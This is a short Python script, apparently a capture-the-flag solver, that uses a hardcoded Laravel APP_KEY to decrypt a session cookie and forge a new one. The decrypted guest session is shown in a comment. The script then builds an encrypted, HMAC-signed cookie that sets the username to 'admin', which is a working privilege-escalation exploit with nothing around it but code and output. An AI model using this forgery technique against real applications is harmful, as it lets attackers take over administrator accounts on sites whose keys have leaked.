import os
import json
import hashlib
import sys
import hmac
import base64
import string
import requests
from Crypto.Cipher import AES
from phpserialize import loads, dumps

# https://gist.github.com/bluetechy/5580fab27510906711a2775f3c4f5ce3


def mcrypt_decrypt(value, iv):
    global key
    AES.key_size = 128
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.decrypt(value)


def mcrypt_encrypt(value, iv):
    global key
    AES.key_size = 128
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.encrypt(value)


def decrypt(bstring):
    global key
    dic = json.loads(base64.b64decode(bstring).decode())
    mac = dic["mac"]
    value = bytes(dic["value"], "utf-8")
    iv = bytes(dic["iv"], "utf-8")
    if mac == hmac.new(key, iv + value, hashlib.sha256).hexdigest():
        return mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))
        # return loads(mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))).decode()
    return ""


def encrypt(string):
    global key
    iv = os.urandom(16)
    # string = dumps(string)
    padding = 16 - len(string) % 16
    string += bytes(chr(padding) * padding, "utf-8")
    value = base64.b64encode(mcrypt_encrypt(string, iv))
    iv = base64.b64encode(iv)
    mac = hmac.new(key, iv + value, hashlib.sha256).hexdigest()
    dic = {"iv": iv.decode(), "value": value.decode(), "mac": mac}
    return base64.b64encode(bytes(json.dumps(dic), "utf-8"))


app_key = "lr2QF678BOzTJQ9b/pSo8PckBDi7/2IAMTlahQ87rpw="
key = base64.b64decode(app_key)
print(
    decrypt(
        # "eyJpdiI6ImJPcklCNDd3ZnhPVHFOT3JXMzJ4TXc9PSIsInZhbHVlIjoiRThxZmFmdkJDS0ZmZDl6bnI3bTVreFBnTTNNNzNlclY3Z2wzRUR3bmo3Z2s1dW5DZG9FSnBpeThYQTlWYU9FQ2UrZnc5a245NVp1c3hiM2YrMytDZkE9PSIsIm1hYyI6IjQ5OWRmODdiZTMwODUxMzM0NjJhYWVkMTI2OGY5ZmExMGEwMGYwMzAyMjY5NjA4YWQ0YThkZGQzMjgxNjQ3NWEifQ=="
        "eyJpdiI6IkFkTnNPenJFUWwzajdWRHZJM04rUEE9PSIsInZhbHVlIjoiTjB6RnVWcEQ5RTFHeENWaVpnUTFWMzRxdG5nUnplTGRRc0NYSm9VUFFoV3RvRDZaSnVRcm9kVFo0azBRUE5EejJ2dExiUUVVeDd0VEgzMCtcL0RFTmNneURGXC93ZjR1REJwaGtYZUJEMUNnbXN5UXZPWlQwXC8wOFlMNXpmZUI0UGlqTmlXNjVDTThMdWc2eTRBWVVSTGYrZk9IbEt4UEE0YUhxdFpKMTAwOGZWZFplWm1cLzJTYTdKSEEzaXU1SEduQ2hBQTlKbFdJT3dDZ1ExQ2pSNVpIaks2XC9SZStCUnhWQVozeEpyOWcwdXZhMnBUWGVqU3dFWm5GdGxlQytMcDlvczhQY2V5czZYNERRUHhHUlh6Q0RZQWVhd3U2dUh5bXFtT0h3Y3FndDd0dHJFczB0YlNpOTNQQ1BWYUtOUVYyMittRzM0alpoNzdzNUFUNWtjXC9yM2lQVWZ4YXIxMFdGdFdHQ28wYTFNdzEwY2NYaUlNMWF6cjA3TmJQdjNsaXJSSVwvR1dZVDVVQVMrUUl4QnozQTkxamhhXC9BS1FuRGpCQWxGb0lOQ0haXC9pWmVucVBBdGxhU2RibkR6RERnV2ttbyIsIm1hYyI6IjUyOGNjNTQwMzNjODU2ZmY0MzQxMGQxZjI5ZTY0NTYwMDlhNTY2Y2Y4Njk1ODAzOWY1NGQ1NzA2M2I2YmI4NzkifQ=="
    )
)
# b'{"data":"a:6:{s:6:\\"_token\\";s:40:\\"vYzY0IdalD2ZC7v9yopWlnnYnCB2NkCXPbzfQ3MV\\";s:8:\\"username\\";s:8:\\"guestc32\\";s:5:\\"order\\";s:2:\\"id\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:38:\\"http:\\/\\/206.189.25.23:31031\\/api\\/configs\\";}}","expires":1605140631}\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e'

print(
    encrypt(
        b's:324:"{"data":"a:6:{s:6:\\"_token\\";s:40:\\"O5yuOKuwQ8kh8SPBYKCoYm8ntNetxrAxHi5h3nQA\\";s:8:\\"username\\";s:5:\\"admin\\";s:5:\\"order\\";s:2:\\"id\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:26:\\"http:\\/\\/142.93.38.140:30899\\";}}","expires":1627173481}";\x03\x03\x03'
    )
)
